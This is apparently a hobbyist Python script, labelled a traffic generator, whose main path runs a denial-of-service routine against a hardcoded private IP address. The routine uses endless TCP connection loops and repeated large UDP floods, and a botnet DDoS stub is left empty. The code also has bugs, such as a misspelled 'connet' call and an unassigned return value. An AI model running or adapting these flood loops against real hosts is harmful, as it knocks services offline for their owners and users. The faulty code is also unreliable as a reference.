# Traffic Generator
from Inputs import get_inputs
import getpass, socket, time, subprocess

# generate regular traffic and requests
def generate_traffic(host, transmission, port, buffer_size):
    if transmission == "TCP":
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connet((host, port))
        if port == 80:
            conn.sendall(b"GET / HTTP/1.1\r\n\r\n")
            data = conn.recv(buffer_size)
            data = data.decode()
            data = data.rstrip()
        else:
            data = conn.recv(buffer_size)
            data = data.decode()
            data = data.rstrip()
    elif transmission == "UDP":
        conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        conn.connect((host, port))
        data = conn.sendto(b"Hello", (host, port))

    return(data)

# attempt denial of service on host
def dos(host, transmission, port, buffer_size):
    print("Denial of service attempt.")
    # do ping requests for ICMP
    if transmission == "ICMP":
        data = ""
        ping_request = "ping {}".format(host)
        for k in range(0,5):
            req = subprocess.Popen(ping_request, stdout=subprocess.PIPE, shell=False)
            stdout = req.communicate()
            #time.sleep(delay)
            print(stdout)
        
    # attempt to cause overload for other TCP/UDP ports
    elif transmission == "TCP":
        while True:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((host, port))

            data = conn.recv(buffer_size)
            data = data.decode()
            data = data.rstrip()

            #time.sleep(delay)

            conn.close()

    elif transmission == "UDP":
        message = b"DENIAL OF SERVICE!!" * 1000
        while True:
            conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            conn.connect((host, port))
            conn.sendto(message, (host, port))
    return(data)

# attempt distributed denial of service on host with multiple bots (botnet)
def ddos(host, transmission, port, buffer_size, botnet):
    return()

username = getpass.getuser()
filename = "C:\\Users\\{}\\eclipse-workspace\\traffic-gen\\inputs.txt".format(username)

inputs = get_inputs(filename)

transmission = inputs['Transmission']
port = int(inputs['Port'])
buffer_size = inputs['PacketSize']

# apply byte conversion if required
if "Kb" in buffer_size:
    buffer_size = buffer_size.replace("Kb", "")
    buffer_size = int(buffer_size) * 1024
elif "B" in buffer_size:
    buffer_size = int(buffer_size.replace("B", ""))

host = "192.168.3.130"

print("Target: {}, Protocol: {}, Port: {}, Buffer Size: {} bytes. \n".format(host, transmission, str(port), str(buffer_size)))

#output = generate_traffic(host, transmission, port, buffer_size)
delay = 0.1

output = dos(host, transmission, port, buffer_size)
print('Received: {}'.format(output))

